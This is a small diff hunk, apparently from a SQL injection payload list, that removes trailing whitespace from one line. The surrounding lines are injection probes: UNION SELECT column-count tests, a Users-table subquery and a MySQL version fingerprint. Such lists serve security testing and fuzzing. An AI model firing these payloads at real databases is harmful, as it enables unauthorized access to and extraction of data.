@@ -61,7 +61,7 @@ AND false
 -1 UNION SELECT 1 INTO @,@
 -1 UNION SELECT 1 INTO @,@,@
 
-1 AND (SELECT * FROM Users) = 1	
+1 AND (SELECT * FROM Users) = 1
 
 ' AND MID(VERSION(),1,1) = '5';
 
